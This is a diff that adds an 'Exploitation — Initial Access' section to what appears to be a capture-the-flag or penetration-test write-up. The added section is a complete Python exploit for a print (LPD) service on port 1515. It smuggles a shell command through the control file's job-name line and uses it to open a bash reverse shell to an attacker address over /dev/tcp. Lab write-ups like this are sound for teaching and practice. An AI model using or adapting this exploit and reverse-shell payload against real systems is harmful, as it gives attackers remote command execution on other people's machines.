@@ -460,6 +460,52 @@ The client-controlled `job_name` is interpolated directly into a shell command r
 <div style="page-break-after: always;"></div>
 
 ## 3. Exploitation — Initial Access
+### 3.1 Exploit Acquisition and Preparation
+
+```python
+import socket
+import time
+
+TARGET = "10.129.35.97"
+PORT = 1515
+ATTACKER_IP = "10.10.15.111"
+ATTACKER_PORT = 4444
+
+def main():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((TARGET, PORT))
+
+    # 1. Command 2 (print job) + empty queue name -> bypasses the substring check
+    s.send(b"\x02\n")
+    time.sleep(0.2)
+
+    # 2. Build the malicious job_name (THIS is the injection — see below)
+    cmd = f"bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1'"
+    job_name = f"'; {cmd}; #"
+
+    # 3. LPD control file: the 'J' line carries the job name the server executes
+    control_file = f"H attacker\nP user\nJ{job_name}\n".encode()
+
+    # 4. Subcommand header: \x02 + "<size> cfA001attacker\n"
+    header = bytes([0x02]) + f"{len(control_file)} cfA001attacker\n".encode()
+    s.send(header)
+    s.recv(1)  # ACK
+
+    # 5. Send the control file body -> triggers the injected command
+    s.send(control_file)
+
+    try:
+        s.recv(2)
+    except socket.timeout:
+        pass
+    s.close()
+    print("[+] Exploit sent. Check your listener!")
+
+if __name__ == "__main__":
+    main()
+```
+
+
 <div align="center">
 <br>
 <br>
